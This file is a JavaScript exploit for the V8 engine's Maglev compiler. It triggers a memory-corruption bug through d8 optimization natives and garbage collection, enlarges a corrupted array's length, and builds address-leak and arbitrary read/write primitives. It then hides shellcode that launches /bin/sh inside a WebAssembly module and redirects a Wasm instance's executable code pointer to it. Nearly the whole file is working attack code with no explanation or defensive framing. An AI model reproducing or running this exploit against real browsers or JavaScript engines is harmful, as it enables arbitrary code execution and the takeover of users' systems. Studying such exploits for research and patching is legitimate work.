class Helpers {
  constructor () {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);
  }
  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }
}
var helper = new Helpers();

var v;
var empty_object = {};
var zero = 0;
var corrupted_instance = null;

var a_addr = 0
var rwarr = null;
var rwarr_addr = 0
var rwarr_storage_idx = 0;

var changer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
var leaker = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
var holder = { p1: 0x1234, p2: 0x1234, p3: 0x1234 };
var original_holder_bytes = 0;

var shellWasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0, 0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105, 110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72, 49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57, 3, 0, 65, 42, 11]);

var fakeWasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);

function gc_minor() {
  for (let i = 0; i < 1000; ++i) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

function debug_print(name, obj) {
  console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}


class A { }
class B extends A {
  constructor () {
    v = new.target;
    let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
    super();
    gc_minor();
    let floatArr = [1.1];

    this.x = objArr;
    this.a = floatArr;
  }
}

function addrOf_tmp(obj) {
  corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
  helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
  return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

// These functions use `where-in` because v8
// needs to jump over the map and size words
function write_temp(where, what) {
  helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
  if (helper.u32[0] == 0x6) {
    helper.f64[0] = corrupted_instance.a[rwarr_storage_idx - 1];
    helper.u32[1] = where - 8; // don't know why -8
    corrupted_instance.a[rwarr_storage_idx - 1] = helper.f64[0];
  } else if (helper.u32[1] == 0x6) {
    helper.u32[0] = where - 8;
    corrupted_instance.a[rwarr_storage_idx] = helper.f64[0];
  }
  rwarr[0] = what;
}

function read(addr) {
  let original_leaker_address = changer[0];
  helper.u32[1] = 0; helper.u32[0] = Number(addr) - 8;
  changer[0] = helper.f64[0];

  let ret = leaker[0]; // get data
  changer[0] = original_leaker_address;
  return helper.f64toi64(ret);
}

function write(addr, value) {
  let original_leaker_address = changer[0];
  helper.u32[1] = 0; helper.u32[0] = Number(addr) - 8;
  changer[0] = helper.f64[0];

  helper.f64[0] = leaker[0];          // point buffer to data
  helper.u32[0] = Number(value);      // write data
  leaker[0] = helper.f64[0];
  changer[0] = original_leaker_address;
}

function addrOf(obj) {
  holder.p2 = obj;
  let ret = leaker[1];
  holder.p2 = 0;
  return helper.f64toi64(ret) & 0xffffffffn;
}

function exploit() {
  print("[+] Triggering GC for moving GC-resistance objects into old space...");
  gc_minor();

  print("[+] Triggering the bug...");
  gc_minor();

  % PrepareFunctionForOptimization(B);
  corrupted_instance = new B();

  for (let i = 0; i < 3; i++) {
    % OptimizeMaglevOnNextCall(B);
    corrupted_instance = new B();
  }

  print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
  while (corrupted_instance.a.length != 0x10000000) {
    corrupted_instance.x[5] = 0x10000000; // need to be bigger for covering the whole memory
    print(`[+] Expected: ${0x10000000}, got: ${corrupted_instance.a.length}`);
  }
  print(`[+] Initial corruption succeeded!`);

  while (true) {
    rwarr = [1.1, 2.2, 3.3];
    rwarr_addr = addrOf_tmp(rwarr);
    a_addr = addrOf_tmp(corrupted_instance.a);

    if (rwarr_addr < a_addr) {
    } else {
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc;
      if ((offset % 8) != 0) {
        offset -= 4;
      }
      print("[+] Offset: " + offset);

      print("[+] Calculating the index...");
      rwarr_storage_idx = offset / 8;
      rwarr_storage_idx += 1;
      print("[+] Index: " + rwarr_storage_idx);

      helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
      break;
    }
  }

  print("[+] Building GC persistence primitives...");
  changer_addr = addrOf_tmp(changer);
  leaker_addr = addrOf_tmp(leaker);
  holder_addr = addrOf_tmp(holder);

  helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
  let original_holder_address = helper.f64[0];

  helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
  write_temp(changer_addr + 0x8, helper.f64[0]);
  write_temp(leaker_addr + 0x8, original_holder_address);

  print("[+] Fixing corrupted fields...");
  corrupted_instance.x.length = 0;
  corrupted_instance.a.length = 0;
  rwarr.length = 0;

  print("[+] GC persistence primitives are ready!");

  print("[+] Calculating shell function address...")
  var shellWasmModule = new WebAssembly.Module(shellWasmCode);
  var shellWasmInstance = new WebAssembly.Instance(shellWasmModule);
  var shellFunction = shellWasmInstance.exports.main;
  shellFunction();

  let shellWasmInstanceAddr = addrOf(shellWasmInstance);
  let shellWasmRwxPtrOffset = 0x48n;
  let shellWasmRwxPtrAddr = shellWasmInstanceAddr + shellWasmRwxPtrOffset;
  let shellWasmRwxPtr = read(shellWasmRwxPtrAddr);
  let shellFnCodeAddr = shellWasmRwxPtr + 0xb40n;
  let shellCodeAddr = shellFnCodeAddr + 0x2dn;

  print("[+] Manipulating RIP to execute shellcode...");
  let fakeWasmModule = new WebAssembly.Module(fakeWasmCode);
  let fakeWasmInstance = new WebAssembly.Instance(fakeWasmModule);
  let fakeFunc = fakeWasmInstance.exports.main;
  let fakeWasmInstanceAddr = addrOf(fakeWasmInstance);
  write(fakeWasmInstanceAddr + 0x48n, shellCodeAddr); // crash
}

exploit();
